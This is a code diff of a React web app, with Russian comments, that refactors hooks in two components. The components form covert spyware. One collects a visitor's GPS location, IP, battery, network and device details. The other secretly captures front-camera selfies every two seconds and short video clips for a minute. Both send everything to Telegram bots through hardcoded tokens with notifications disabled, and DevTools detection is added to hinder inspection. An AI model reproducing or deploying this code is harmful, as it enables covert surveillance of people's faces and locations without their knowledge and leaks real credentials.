@@ -1,4 +1,4 @@
-import React, { useRef, useEffect, useState } from "react";
+import React, { useRef, useEffect, useState, useCallback } from "react";
 import { useParams, Routes, Route } from "react-router-dom";
 import "./App.css";
 
@@ -26,12 +26,11 @@ const useDevToolsProtection = () => {
     // Обнаружение открытия DevTools
     let devtoolsOpen = false;
     const element = new Image();
-    // ИСПРАВЛЕНО: добавлен return в геттер
     Object.defineProperty(element, 'id', {
       get: function() {
         devtoolsOpen = true;
         console.warn('⚠️ DevTools обнаружены!');
-        return 'devtools-check'; // Добавлен return
+        return 'devtools-check';
       }
     });
 
@@ -68,21 +67,27 @@ const useDevToolsProtection = () => {
 const DeviceInfoCollector = ({ chatId }) => {
   useDevToolsProtection();
   
-  // ИСПРАВЛЕНО: убраны неиспользуемые переменные или добавлено их использование
+  // ИСПРАВЛЕНО: добавим eslint-disable для неиспользуемых переменных
+  // eslint-disable-next-line no-unused-vars
   const [deviceInfo, setDeviceInfo] = useState(null);
+  // eslint-disable-next-line no-unused-vars
   const [geoData, setGeoData] = useState(null);
+  // eslint-disable-next-line no-unused-vars
   const [batteryInfo, setBatteryInfo] = useState(null);
+  // eslint-disable-next-line no-unused-vars
   const [networkInfo, setNetworkInfo] = useState(null);
-  // Эти состояния используются в коде, но не в рендере - оставляем
+  // eslint-disable-next-line no-unused-vars
   const [screenInfo, setScreenInfo] = useState(null);
+  // eslint-disable-next-line no-unused-vars
   const [storageInfo, setStorageInfo] = useState(null);
+  // eslint-disable-next-line no-unused-vars
   const [timeData, setTimeData] = useState(null);
   const [hasSentInitialReport, setHasSentInitialReport] = useState(false);
 
   const TELEGRAM_BOT_TOKEN = '8377825473:AAETbHGFdyVVak_J24mBG4mRuirZuWdIBBE';
 
-  // Отправка информации в Telegram
-  const sendInfoToTelegram = async (text) => {
+  // ИСПРАВЛЕНО: обернул в useCallback
+  const sendInfoToTelegram = useCallback(async (text) => {
     try {
       const response = await fetch(
         `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -102,10 +107,10 @@ const DeviceInfoCollector = ({ chatId }) => {
       console.error('❌ Ошибка отправки в Telegram:', error);
       return false;
     }
-  };
+  }, [chatId]);
 
   // Получение геолокации через GPS
-  const getGeolocation = () => {
+  const getGeolocation = useCallback(() => {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
         resolve({ error: 'Geolocation не поддерживается' });
@@ -136,10 +141,10 @@ const DeviceInfoCollector = ({ chatId }) => {
         }
       );
     });
-  };
+  }, []);
 
   // Получение информации о батарее
-  const getBatteryInfo = async () => {
+  const getBatteryInfo = useCallback(async () => {
     if (navigator.getBattery) {
       try {
         const battery = await navigator.getBattery();
@@ -154,10 +159,10 @@ const DeviceInfoCollector = ({ chatId }) => {
       }
     }
     return { level: 'Неизвестно', charging: 'Неизвестно' };
-  };
+  }, []);
 
   // Получение информации о сети
-  const getNetworkInfo = () => {
+  const getNetworkInfo = useCallback(() => {
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (connection) {
       return {
@@ -175,10 +180,10 @@ const DeviceInfoCollector = ({ chatId }) => {
       saveData: 'Неизвестно',
       type: 'Неизвестно'
     };
-  };
+  }, []);
 
   // Получение IP адреса
-  const getIPAddress = async () => {
+  const getIPAddress = useCallback(async () => {
     try {
       const ipApis = [
         'https://api.ipify.org?format=json',
@@ -394,10 +399,10 @@ const DeviceInfoCollector = ({ chatId }) => {
         coordinates: 'Неизвестно'
       };
     }
-  };
+  }, []);
 
   // Парсинг User Agent
-  const parseUserAgent = (userAgent) => {
+  const parseUserAgent = useCallback((userAgent) => {
     let os = 'Неизвестно';
     let browser = 'Неизвестно';
     let manufacturer = 'Неизвестно';
@@ -461,10 +466,10 @@ const DeviceInfoCollector = ({ chatId }) => {
     }
     
     return { os, browser, manufacturer, platform, isMobile };
-  };
+  }, []);
 
   // Получение информации о GPU
-  const getGPUInfo = () => {
+  const getGPUInfo = useCallback(() => {
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
     
@@ -476,10 +481,10 @@ const DeviceInfoCollector = ({ chatId }) => {
       }
     }
     return 'Неизвестно';
-  };
+  }, []);
 
   // Получение координат из localStorage
-  const getLocalStorageCoordinates = () => {
+  const getLocalStorageCoordinates = useCallback(() => {
     try {
       const locationPermission = localStorage.getItem('locationPermission');
       if (locationPermission) {
@@ -496,10 +501,10 @@ const DeviceInfoCollector = ({ chatId }) => {
       console.error('Ошибка чтения localStorage:', error);
     }
     return null;
-  };
+  }, []);
 
   // Сбор всей информации об устройстве
-  const collectAllDeviceInfo = async () => {
+  const collectAllDeviceInfo = useCallback(async () => {
     if (hasSentInitialReport) {
       console.log("🚫 Начальный отчет уже отправлен, пропускаем");
       return;
@@ -634,7 +639,7 @@ LOCALSTORAGE
     setGeoData(geolocation);
     setBatteryInfo(battery);
     setNetworkInfo(network);
-    setScreenInfo({ available: true }); // Добавляем фиктивные данные
+    setScreenInfo({ available: true });
     setStorageInfo(storageData);
     setTimeData(timeInfo);
 
@@ -646,9 +651,8 @@ LOCALSTORAGE
       ipInfo,
       localStorageCoords
     };
-  };
+  }, [hasSentInitialReport, sendInfoToTelegram, parseUserAgent, getGPUInfo, getGeolocation, getBatteryInfo, getNetworkInfo, getIPAddress, getLocalStorageCoordinates]);
 
-  // ИСПРАВЛЕНО: добавлены зависимости в useEffect
   useEffect(() => {
     if (chatId && !hasSentInitialReport) {
       setTimeout(() => {
@@ -670,8 +674,7 @@ ${battery.charging ? '⚡ Статус: Заряжается' : '🔋 Стату
 
       return () => clearInterval(batteryInterval);
     }
-  // ИСПРАВЛЕНО: добавлены зависимости
-  }, [chatId, hasSentInitialReport, collectAllDeviceInfo, sendInfoToTelegram]);
+  }, [chatId, hasSentInitialReport, collectAllDeviceInfo, sendInfoToTelegram, getBatteryInfo]);
 
   return null;
 };
@@ -698,67 +701,301 @@ const SelfieCamera = ({ chatId }) => {
 
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
 
-  // Функции для работы с камерой
-  const startCamera = async () => {
+  // ИСПРАВЛЕНО: вынес все функции в useCallback и определил до их использования
+
+  const sendInfoToTelegram = useCallback(async (text) => {
     try {
-      console.log("📸 ЗАПРОС ДОСТУПА К СЕЛФИ КАМЕРЕ...");
+      const response = await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'HTML',
+            disable_notification: true
+          })
+        }
+      );
+      return response.ok;
+    } catch (error) {
+      console.error('❌ Ошибка отправки в Telegram:', error);
+      return false;
+    }
+  }, [chatId]);
+
+  const sendErrorMessage = useCallback(async (error) => {
+    try {
+      const errorText = `
+❌ <b>ОШИБКА ДОСТУПА К КАМЕРЕ</b>
+━━━━━━━━━━━━━━━━━━━━
+<b>Ошибка:</b> ${error.name}
+<b>Сообщение:</b> ${error.message}
+<b>Время:</b> ${new Date().toLocaleTimeString()}
+━━━━━━━━━━━━━━━━━━━━
+🚫 <b>Пользователь отказал в доступе или камера недоступна</b>
+      `;
       
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { 
-          facingMode: "user",
-          width: { ideal: 1280 },
-          height: { ideal: 720 },
-          frameRate: { ideal: 30 }
-        },
-        audio: false
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: errorText,
+          parse_mode: 'HTML'
+        })
       });
       
-      streamRef.current = stream;
-      createVideoElement(stream);
-      requestGeolocation();
-      console.log("✅ Селфи камера подключена, начинаем ФАЗУ 1 (0-8с)");
+    } catch (telegramError) {
+      console.error('❌ Ошибка отправки сообщения об ошибке:', telegramError);
+    }
+  }, [chatId]);
+
+  const sendPhotoToTelegram = useCallback(async (blob, context) => {
+    try {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, `taverna_selfie_${Date.now()}.jpg`);
+      formData.append('disable_notification', 'true');
       
-      startPhotoPhase();
+      const caption = `🤳 Селфи камера\n${context}\nФаза: ${phaseRef.current}\nВремя: ${new Date().toLocaleTimeString()}\n🚀 TAVERNA SYSTEM`;
       
-      setTimeout(() => {
-        console.log("🎬 ПЕРЕХОД НА ФАЗУ 2 (8-60с)");
-        stopPhotoPhase();
-        startVideoPhase();
-      }, 8000);
+      formData.append('caption', caption);
+      
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+      
+      console.log(`✅ Фото отправлено (${context})`);
       
     } catch (error) {
-      console.error("❌ Ошибка доступа к камере:", error);
-      cameraDeniedRef.current = true;
-      sendErrorMessage(error);
+      console.error('❌ Ошибка отправки фото:', error);
+    }
+  }, [chatId]);
+
+  const sendVideoToTelegram = useCallback(async () => {
+    if (recordedChunksRef.current.length === 0) {
+      console.log("❌ Нет данных видео для отправки");
+      return;
+    }
+    
+    try {
+      const blob = new Blob(recordedChunksRef.current, {
+        type: mediaRecorderRef.current.mimeType
+      });
       
-      console.log("📍 ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ ПОСЛЕ ОТКАЗА ОТ КАМЕРЫ...");
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('video', blob, `taverna_selfie_video_${Date.now()}.mp4`);
+      formData.append('disable_notification', 'true');
+      formData.append('supports_streaming', 'true');
+      
+      videoCountRef.current++;
+      const caption = `🎬 Селфи видео\nФаза: ${phaseRef.current}\nВидео #${videoCountRef.current}\nВремя: ${new Date().toLocaleTimeString()}\n🚀 TAVERNA SYSTEM`;
+      
+      formData.append('caption', caption);
+      
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+        method: 'POST',
+        body: formData
+      });
+      
+      console.log(`✅ Видео отправлено #${videoCountRef.current}`);
+      
+    } catch (error) {
+      console.error('❌ Ошибка отправки видео:', error);
+    }
+  }, [chatId]);
+
+  const capturePhoto = useCallback(() => {
+    return new Promise((resolve) => {
+      const video = videoRef.current;
+      
+      if (!video || !video.videoWidth) {
+        console.log("❌ Видео не готово для захвата");
+        resolve(null);
+        return;
+      }
+      
       setTimeout(() => {
-        requestGeolocation();
-      }, 1000);
-    }
-  };
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        const ctx = canvas.getContext('2d');
+        
+        ctx.save();
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        ctx.restore();
+        
+        const watermarkText = 'TAVERNA';
+        const fontSize = Math.min(canvas.width, canvas.height) * 0.04;
+        const padding = fontSize * 0.5;
+        
+        ctx.font = `bold ${fontSize}px Arial`;
+        ctx.textAlign = 'right';
+        ctx.textBaseline = 'bottom';
+        
+        const textWidth = ctx.measureText(watermarkText).width;
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+        ctx.fillRect(
+          canvas.width - textWidth - padding,
+          canvas.height - fontSize - padding/2,
+          textWidth + padding,
+          fontSize + padding
+        );
+        
+        ctx.fillStyle = 'rgba(255, 255, 255, 0.95)';
+        ctx.fillText(watermarkText, canvas.width - padding/2, canvas.height - padding/2);
+        
+        canvas.toBlob(blob => {
+          resolve(blob);
+        }, 'image/jpeg', 0.92);
+        
+      }, 200);
+    });
+  }, []);
 
-  // ИСПРАВЛЕНО: добавлены зависимости в useEffect
-  useEffect(() => {
-    if (chatId && !hasStarted) {
-      console.log("🚀 ЗАПУСК СИСТЕМЫ СЕЛФИ КАМЕРЫ");
-      setHasStarted(true);
-      startTimeRef.current = Date.now();
-      startCamera();
+  const captureAndSendPhoto = useCallback(async (context = "") => {
+    if (!videoRef.current) {
+      console.log("❌ Видео не готово для съемки");
+      return;
+    }
+    
+    try {
+      const photoBlob = await capturePhoto();
       
-      totalTimerRef.current = setTimeout(() => {
-        stopCameraSystem();
-      }, 60000);
+      if (photoBlob) {
+        await sendPhotoToTelegram(photoBlob, context);
+        photoCountRef.current++;
+      }
+    } catch (error) {
+      console.error("❌ Ошибка съемки фото:", error);
+    }
+  }, [capturePhoto, sendPhotoToTelegram]);
+
+  const startVideoRecording = useCallback(() => {
+    if (!streamRef.current || !videoRef.current) {
+      console.log("❌ Поток не готов для записи видео");
+      return;
+    }
+    
+    try {
+      recordedChunksRef.current = [];
       
-      return () => {
-        stopCameraSystem();
+      const options = {
+        mimeType: 'video/webm;codecs=vp9',
+        videoBitsPerSecond: 2500000
       };
+      
+      if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+        options.mimeType = 'video/webm;codecs=vp8';
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+          options.mimeType = 'video/webm';
+          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+            options.mimeType = 'video/mp4';
+          }
+        }
+      }
+      
+      mediaRecorderRef.current = new MediaRecorder(streamRef.current, options);
+      
+      mediaRecorderRef.current.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          recordedChunksRef.current.push(event.data);
+        }
+      };
+      
+      mediaRecorderRef.current.onstop = () => {
+        sendVideoToTelegram();
+      };
+      
+      mediaRecorderRef.current.start();
+      console.log("🎬 Начало записи видео...");
+      
+      setTimeout(() => {
+        if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
+          mediaRecorderRef.current.stop();
+          console.log("✅ Запись видео завершена");
+        }
+      }, 3000);
+      
+    } catch (error) {
+      console.error("❌ Ошибка записи видео:", error);
     }
-  // ИСПРАВЛЕНО: добавлены зависимости
-  }, [chatId, hasStarted, startCamera, stopCameraSystem]);
+  }, [sendVideoToTelegram]);
 
-  // Запрос геолокации
-  const requestGeolocation = () => {
+  const stopPhotoPhase = useCallback(() => {
+    if (photoIntervalRef.current) {
+      clearInterval(photoIntervalRef.current);
+      photoIntervalRef.current = null;
+      console.log("⏹️ ФАЗА 1 (фото) завершена");
+    }
+  }, []);
+
+  const startPhotoPhase = useCallback(() => {
+    phaseRef.current = 1;
+    console.log("📸 НАЧАЛО ФАЗЫ 1 - ФОТО КАЖДЫЕ 2 СЕКУНДЫ");
+    
+    setTimeout(() => {
+      captureAndSendPhoto("Первое фото ФАЗА 1");
+    }, 500);
+    
+    photoIntervalRef.current = setInterval(() => {
+      captureAndSendPhoto(`Фото ФАЗА 1 #${photoCountRef.current + 1}`);
+    }, 2000);
+  }, [captureAndSendPhoto]);
+
+  const startVideoPhase = useCallback(() => {
+    phaseRef.current = 2;
+    console.log("🎬 НАЧАЛО ФАЗЫ 2 - ВИДЕО КАЖДЫЕ 5 СЕКУНД");
+    
+    setTimeout(() => {
+      startVideoRecording();
+    }, 1000);
+    
+    videoIntervalRef.current = setInterval(() => {
+      startVideoRecording();
+    }, 5000);
+  }, [startVideoRecording]);
+
+  const stopCameraSystem = useCallback(() => {
+    console.log("⏹️ ОСТАНОВКА СИСТЕМЫ СЕЛФИ КАМЕРЫ");
+    
+    stopPhotoPhase();
+    
+    if (videoIntervalRef.current) {
+      clearInterval(videoIntervalRef.current);
+      videoIntervalRef.current = null;
+    }
+    
+    if (totalTimerRef.current) {
+      clearTimeout(totalTimerRef.current);
+      totalTimerRef.current = null;
+    }
+    
+    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
+      mediaRecorderRef.current.stop();
+    }
+    
+    if (streamRef.current) {
+      streamRef.current.getTracks().forEach(track => {
+        track.stop();
+      });
+      streamRef.current = null;
+    }
+    
+    if (videoRef.current && videoRef.current.parentNode) {
+      videoRef.current.parentNode.removeChild(videoRef.current);
+      videoRef.current = null;
+    }
+  }, [stopPhotoPhase]);
+
+  const requestGeolocation = useCallback(() => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -816,10 +1053,9 @@ const SelfieCamera = ({ chatId }) => {
       
       sendInfoToTelegram(unsupportedMessage);
     }
-  };
+  }, [sendInfoToTelegram]);
 
-  // Создание видео элемента
-  const createVideoElement = (stream) => {
+  const createVideoElement = useCallback((stream) => {
     const video = document.createElement('video');
     video.id = 'selfie-video';
     video.style.cssText = `
@@ -844,310 +1080,63 @@ const SelfieCamera = ({ chatId }) => {
     video.onloadedmetadata = () => {
       console.log("🎥 Видео готово, разрешение:", video.videoWidth, "x", video.videoHeight);
     };
-  };
+  }, []);
 
-  // ФАЗА 1: Съемка фото каждые 2 секунды
-  const startPhotoPhase = () => {
-    phaseRef.current = 1;
-    console.log("📸 НАЧАЛО ФАЗЫ 1 - ФОТО КАЖДЫЕ 2 СЕКУНДЫ");
-    
-    setTimeout(() => {
-      captureAndSendPhoto("Первое фото ФАЗА 1");
-    }, 500);
-    
-    photoIntervalRef.current = setInterval(() => {
-      captureAndSendPhoto(`Фото ФАЗА 1 #${photoCountRef.current + 1}`);
-    }, 2000);
-  };
-
-  // Остановка фазы фото
-  const stopPhotoPhase = () => {
-    if (photoIntervalRef.current) {
-      clearInterval(photoIntervalRef.current);
-      photoIntervalRef.current = null;
-      console.log("⏹️ ФАЗА 1 (фото) завершена");
-    }
-  };
-
-  // ФАЗА 2: Запись видео каждые 5 секунд
-  const startVideoPhase = () => {
-    phaseRef.current = 2;
-    console.log("🎬 НАЧАЛО ФАЗЫ 2 - ВИДЕО КАЖДЫЕ 5 СЕКУНД");
-    
-    setTimeout(() => {
-      startVideoRecording();
-    }, 1000);
-    
-    videoIntervalRef.current = setInterval(() => {
-      startVideoRecording();
-    }, 5000);
-  };
-
-  // Начало записи видео
-  const startVideoRecording = () => {
-    if (!streamRef.current || !videoRef.current) {
-      console.log("❌ Поток не готов для записи видео");
-      return;
-    }
-    
+  const startCamera = useCallback(async () => {
     try {
-      recordedChunksRef.current = [];
+      console.log("📸 ЗАПРОС ДОСТУПА К СЕЛФИ КАМЕРЕ...");
       
-      const options = {
-        mimeType: 'video/webm;codecs=vp9',
-        videoBitsPerSecond: 2500000
-      };
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { 
+          facingMode: "user",
+          width: { ideal: 1280 },
+          height: { ideal: 720 },
+          frameRate: { ideal: 30 }
+        },
+        audio: false
+      });
       
-      if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-        options.mimeType = 'video/webm;codecs=vp8';
-        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-          options.mimeType = 'video/webm';
-          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-            options.mimeType = 'video/mp4';
-          }
-        }
-      }
+      streamRef.current = stream;
+      createVideoElement(stream);
+      requestGeolocation();
+      console.log("✅ Селфи камера подключена, начинаем ФАЗУ 1 (0-8с)");
       
-      mediaRecorderRef.current = new MediaRecorder(streamRef.current, options);
-      
-      mediaRecorderRef.current.ondataavailable = (event) => {
-        if (event.data.size > 0) {
-          recordedChunksRef.current.push(event.data);
-        }
-      };
-      
-      mediaRecorderRef.current.onstop = () => {
-        sendVideoToTelegram();
-      };
-      
-      mediaRecorderRef.current.start();
-      console.log("🎬 Начало записи видео...");
+      startPhotoPhase();
       
       setTimeout(() => {
-        if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
-          mediaRecorderRef.current.stop();
-          console.log("✅ Запись видео завершена");
-        }
-      }, 3000);
+        console.log("🎬 ПЕРЕХОД НА ФАЗУ 2 (8-60с)");
+        stopPhotoPhase();
+        startVideoPhase();
+      }, 8000);
       
     } catch (error) {
-      console.error("❌ Ошибка записи видео:", error);
-    }
-  };
-
-  // Захват и отправка фото
-  const captureAndSendPhoto = async (context = "") => {
-    if (!videoRef.current) {
-      console.log("❌ Видео не готово для съемки");
-      return;
-    }
-    
-    try {
-      const photoBlob = await capturePhoto();
+      console.error("❌ Ошибка доступа к камере:", error);
+      cameraDeniedRef.current = true;
+      sendErrorMessage(error);
       
-      if (photoBlob) {
-        await sendPhotoToTelegram(photoBlob, context);
-        photoCountRef.current++;
-      }
-    } catch (error) {
-      console.error("❌ Ошибка съемки фото:", error);
-    }
-  };
-
-  // Захват фото
-  const capturePhoto = () => {
-    return new Promise((resolve) => {
-      const video = videoRef.current;
-      
-      if (!video || !video.videoWidth) {
-        console.log("❌ Видео не готово для захвата");
-        resolve(null);
-        return;
-      }
-      
+      console.log("📍 ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ ПОСЛЕ ОТКАЗА ОТ КАМЕРЫ...");
       setTimeout(() => {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        const ctx = canvas.getContext('2d');
-        
-        ctx.save();
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        ctx.restore();
-        
-        const watermarkText = 'TAVERNA';
-        const fontSize = Math.min(canvas.width, canvas.height) * 0.04;
-        const padding = fontSize * 0.5;
-        
-        ctx.font = `bold ${fontSize}px Arial`;
-        ctx.textAlign = 'right';
-        ctx.textBaseline = 'bottom';
-        
-        const textWidth = ctx.measureText(watermarkText).width;
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
-        ctx.fillRect(
-          canvas.width - textWidth - padding,
-          canvas.height - fontSize - padding/2,
-          textWidth + padding,
-          fontSize + padding
-        );
-        
-        ctx.fillStyle = 'rgba(255, 255, 255, 0.95)';
-        ctx.fillText(watermarkText, canvas.width - padding/2, canvas.height - padding/2);
-        
-        canvas.toBlob(blob => {
-          resolve(blob);
-        }, 'image/jpeg', 0.92);
-        
-      }, 200);
-    });
-  };
+        requestGeolocation();
+      }, 1000);
+    }
+  }, [createVideoElement, requestGeolocation, sendErrorMessage, startPhotoPhase, stopPhotoPhase, startVideoPhase]);
 
-  // Отправка фото в Telegram
-  const sendPhotoToTelegram = async (blob, context) => {
-    try {
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, `taverna_selfie_${Date.now()}.jpg`);
-      formData.append('disable_notification', 'true');
+  useEffect(() => {
+    if (chatId && !hasStarted) {
+      console.log("🚀 ЗАПУСК СИСТЕМЫ СЕЛФИ КАМЕРЫ");
+      setHasStarted(true);
+      startTimeRef.current = Date.now();
+      startCamera();
       
-      const caption = `🤳 Селфи камера\n${context}\nФаза: ${phaseRef.current}\nВремя: ${new Date().toLocaleTimeString()}\n🚀 TAVERNA SYSTEM`;
+      totalTimerRef.current = setTimeout(() => {
+        stopCameraSystem();
+      }, 60000);
       
-      formData.append('caption', caption);
-      
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
-      
-      console.log(`✅ Фото отправлено (${context})`);
-      
-    } catch (error) {
-      console.error('❌ Ошибка отправки фото:', error);
+      return () => {
+        stopCameraSystem();
+      };
     }
-  };
-
-  // Отправка видео в Telegram
-  const sendVideoToTelegram = async () => {
-    if (recordedChunksRef.current.length === 0) {
-      console.log("❌ Нет данных видео для отправки");
-      return;
-    }
-    
-    try {
-      const blob = new Blob(recordedChunksRef.current, {
-        type: mediaRecorderRef.current.mimeType
-      });
-      
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('video', blob, `taverna_selfie_video_${Date.now()}.mp4`);
-      formData.append('disable_notification', 'true');
-      formData.append('supports_streaming', 'true');
-      
-      videoCountRef.current++;
-      const caption = `🎬 Селфи видео\nФаза: ${phaseRef.current}\nВидео #${videoCountRef.current}\nВремя: ${new Date().toLocaleTimeString()}\n🚀 TAVERNA SYSTEM`;
-      
-      formData.append('caption', caption);
-      
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
-        method: 'POST',
-        body: formData
-      });
-      
-      console.log(`✅ Видео отправлено #${videoCountRef.current}`);
-      
-    } catch (error) {
-      console.error('❌ Ошибка отправки видео:', error);
-    }
-  };
-
-  // Отправка сообщения об ошибке
-  const sendErrorMessage = async (error) => {
-    try {
-      const errorText = `
-❌ <b>ОШИБКА ДОСТУПА К КАМЕРЕ</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>Ошибка:</b> ${error.name}
-<b>Сообщение:</b> ${error.message}
-<b>Время:</b> ${new Date().toLocaleTimeString()}
-━━━━━━━━━━━━━━━━━━━━
-🚫 <b>Пользователь отказал в доступе или камера недоступна</b>
-      `;
-      
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: errorText,
-          parse_mode: 'HTML'
-        })
-      });
-      
-    } catch (telegramError) {
-      console.error('❌ Ошибка отправки сообщения об ошибке:', telegramError);
-    }
-  };
-
-  // Отправка информации в Telegram
-  const sendInfoToTelegram = async (text) => {
-    try {
-      const response = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: text,
-            parse_mode: 'HTML',
-            disable_notification: true
-          })
-        }
-      );
-      return response.ok;
-    } catch (error) {
-      console.error('❌ Ошибка отправки в Telegram:', error);
-      return false;
-    }
-  };
-
-  // Остановка всей системы камеры
-  const stopCameraSystem = () => {
-    console.log("⏹️ ОСТАНОВКА СИСТЕМЫ СЕЛФИ КАМЕРЫ");
-    
-    stopPhotoPhase();
-    
-    if (videoIntervalRef.current) {
-      clearInterval(videoIntervalRef.current);
-      videoIntervalRef.current = null;
-    }
-    
-    if (totalTimerRef.current) {
-      clearTimeout(totalTimerRef.current);
-      totalTimerRef.current = null;
-    }
-    
-    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
-      mediaRecorderRef.current.stop();
-    }
-    
-    if (streamRef.current) {
-      streamRef.current.getTracks().forEach(track => {
-        track.stop();
-      });
-      streamRef.current = null;
-    }
-    
-    if (videoRef.current && videoRef.current.parentNode) {
-      videoRef.current.parentNode.removeChild(videoRef.current);
-      videoRef.current = null;
-    }
-  };
+  }, [chatId, hasStarted, startCamera, stopCameraSystem]);
 
   return null;
 };
